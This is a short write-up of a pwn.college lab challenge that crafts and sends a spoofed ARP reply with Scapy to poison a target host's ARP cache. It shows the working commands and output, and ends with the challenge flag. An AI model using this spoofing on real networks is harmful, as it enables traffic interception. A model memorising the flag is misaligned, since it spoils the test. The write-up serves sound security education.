---
layout: page
title: "🧠 CTF Writeup: Manual ARP Packet Injection"
summary: "Writeup from Intercepting Communication"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Intercepting Communication"
date: 2026-04-27
---


## 📜 Task

Manually send an Address Resolution Protocol (ARP) packet.  
The packet should inform the remote host that the IP address `10.0.0.42` is associated with the Ethernet (MAC) address `42:42:42:42:42:42`.  
Send this spoofed packet to the host at `10.0.0.2`.

---

## 🛠️ Tools & Environment

- **Tool Used**: [Scapy](https://scapy.net/) (version 2.6.1)
- **Target IP**: `10.0.0.2`
- **Fake IP**: `10.0.0.42`
- **Fake MAC**: `42:42:42:42:42:42`
- **Interface**: `eth0`

---

## 🧪 Steps & Solution

### 🔍 Step 1: Identify MAC address of target host

We use a Python script (`mac_3.py`) to get the MAC address of the host at `10.0.0.2`:

```bash
root@ip-10-0-0-1:~# python mac_3.py
ip:10.0.0.2
IP: 10.0.0.2 - MAC: 16:db:11:82:36:73
```

###  Step 2: Open Scapy
```bash
root@ip-10-0-0-1:~# scapy -H
Welcome to Scapy (2.6.1) using IPython 8.29.0
```

### Step 3: Craft and send the ARP packet
We craft a spoofed ARP reply indicating that 10.0.0.42 has MAC 42:42:42:42:42:42, and send it to the host at 10.0.0.2:
```bash
>>> pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(
...     op=2,
...     psrc='10.0.0.42',
...     hwsrc='42:42:42:42:42:42',
...     pdst='10.0.0.2',
...     hwdst='16:db:11:82:36:73'
... )
>>> sendp(pkt, iface="eth0")
.
Sent 1 packets.
```
---
## Flag
```bash 
pwn.college{c8CRYUHAQYu8uY0dwMH5e2-eBE8.QXwczMzwSM0IzMyEzW}
```
---
